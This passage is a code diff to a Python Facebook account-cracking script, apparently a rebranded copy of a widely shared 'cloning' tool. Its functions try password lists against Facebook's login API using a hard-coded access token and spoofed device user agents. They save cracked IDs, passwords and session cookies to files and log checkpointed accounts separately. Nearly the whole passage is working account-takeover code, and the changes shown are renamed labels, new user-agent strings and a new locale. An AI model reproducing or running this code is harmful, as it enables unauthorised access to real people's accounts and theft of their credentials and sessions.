80', 'Rhyme', 'RM-560', 'Ruby'])
+                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
                         bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
                         mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                         mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                       # ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(100,500))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(50,200)) +";FBBV/"+str(random.randint(111111111,666666666))+";[FBAN/"+"FB4A;FBAV/"+"372.0.0.4524;FBBV/"+"3136351;FBDM/"+"{density=1.4,width=1322,height=1574};FBLC/"+"en_PK;FBRV/"+"958105032;FBCR/"+"Ufone;FBMF/"+"RMX3662;FBBD/"+"Realme;FBPN/"+"com.facebook.katana;FBDV/"+"RMX3662;FBSV/"+"7;FBOP/"+"4;FBCA/"+"x86:armeabi-v7a;]"+"[FBAN/"+"FB4A;FBAV/"+"410.0.0.3313;FBBV/"+"3735186;FBDM/"+"{density=3.8,width=1093,height=1317};FBLC/"+"en_PK;FBRV/"+"799203831;FBCR/"+"Mobilink;FBMF/"+"RMX5376;FBBD/"+"Realme;FBPN/"+"com.facebook.lite;FBDV/"+"RMX5376;FBSV/"+"1;FBOP/"+"2;FBCA/"+"x86:armeabi-v7a;]"+"[FBAN/"+"FB4A;FBAV/"+"388.0.0.1714;FBBV/"+"6365230;FBDM/"+"{density=3.0,width=1114,height=2553};FBLC/"+"en_PK;FBRV/"+"212681290;FBCR/"+"Zong;FBMF/"+"RMX9267;FBBD/"+"Realme;FBPN/"+"com.facebook.katana;FBDV/"+"RMX9267;FBSV/"+"14;FBOP/"+"3;FBCA/"+"x86:armeabi-v7a;]"
-                        ua  = ua_api()
+                        ua  = '[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/({density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097190;FBDM/({density=1.5,width=480,height=800};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/*{density=4.0,width=1440,eight=2560};FBLC/en_US;FBCR/3.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+mmp+';FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi:;]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -723,23 +488,23 @@ def api(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [LEGEND-USMII-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/USMII-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [SHAHI JOKER-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[USMII-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[JOKER-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-USMII-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/USMII-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;31m [ALONE-JOKER-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/USMII-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -750,7 +515,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [USMII-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [JOKER-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -774,7 +539,7 @@ def api1(ids,names,passlist):
                         en = random.choice(['en_US','en_GB'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM({density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]"
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/"+"FB4A;FBAV/"+";FBBV/"+";[FBAN/"+"Orca-Android;FBAV/"+"233.0.0.16.158;FBBV/"+"172917909;FBDM({density=3.0,width=1080,height=1920};FBLC/"+"en_US;FBCR/"+"null;FBMF/"+"vivo;FBBD/"+"vivo;FBPN/"+"com.facebook.katana;FBDV/"+"vivo V3Max;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -823,11 +588,11 @@ def api1(ids,names,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [LEGEND-USMII-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SHAHI JOKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/usmii-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/USMII-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/JOKER-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/JOKER-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -837,8 +602,8 @@ def api1(ids,names,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                    #    print('\r\r\x1b[1;31m [USMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/USMII-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                    #    print('\r\r\x1b[1;31m [JOKER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/JOKER-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -849,7 +614,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [USMII-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [JOKER-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -879,7 +644,8 @@ def rndm(ids,passlist):
                         mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(100,500))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(50,200)) +";FBBV/"+str(random.randint(111111111,666666666))+";[FBAN/"+"FB4A;FBAV/"+"275.0.0.23.70;FBBV/"+"434086659;FBDM/"+"{density=2.0,width=720,height=1384};FBLC/"+"en_GB;FBRV/"+"0;FBCR/Airtel;FBMF/"+"samsung;FBBD/"+"samsung;FBPN/"+"com.facebook.katana;FBDV/"+"SM-J500M;FBSV/"+"7.0;FBOP/"+"14;FBCA/"+"armeabi-v7a:armeabi;]"
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/"+"FB4A;FBAV/"+";FBBV/"+";[FBAN/"+"Orca-Android;FBAV/"+"233.0.0.16.158;FBBV/"+"172917909;FBDM({density=3.0,width=1080,height=1920};FBLC/"+"en_US;FBCR/"+"null;FBMF/"+"vivo;FBBD/"+"vivo;FBPN/"+"com.facebook.katana;FBDV/"+"vivo V3Max;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"
+                        
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -907,7 +673,7 @@ def rndm(ids,passlist):
                                 'enroll_misauth': 'false', 
                                 'generate_session_cookies': '1',
                                 'generate_machine_id': '1', 
-                                'locale': 'en_GB', 'client_country_code': 'US',
+                                'locale': 'fa_AF', 'client_country_code': 'AF',
                                 'fb_api_req_friendly_name': 'authenticate'}
                         headers={
                                 'User-Agent':ua,
@@ -916,7 +682,7 @@ def rndm(ids,passlist):
                                 'Connection': 'keep-alive', 
                                 'Authorization':f'OAuth {accessToken}', 
                                 'X-FB-Friendly-Name': 'authenticate', 
-                                'X-FB-Connection-Type': 'Liger', 
+                                'X-FB-Connection-Type': 'unknown', 
                                 'Content-Type': 'application/x-www-form-urlencoded', 
                                 'X-FB-HTTP-Engine': 'Liger'
                                 }
@@ -931,11 +697,11 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [LEGEND-USMII-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [SHAHI JOKER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/usmii-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/USMII-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/JOKER-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/JOKER-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -945,21 +711,17 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                    #    print('\r\r\x1b[1;31m [USMII-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/USMII-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                    #    print('\r\r\x1b[1;31m [JOKER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/JOKER-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
                 loop+=1
         except Exception as e:
                 pass
-
-
-#try:
-#    
-#        approval()
-#except requests.exceptions.ConnectionError:
-#        print('\n No internet connection ...')
-#        exit()
-menu()
-#https://pasteit.free.nf/paste/fRWfQUer
+                        
+try:
+        menu()
+except requests.exceptions.ConnectionError:
+        print('\n No internet connection ...')
+        exit()
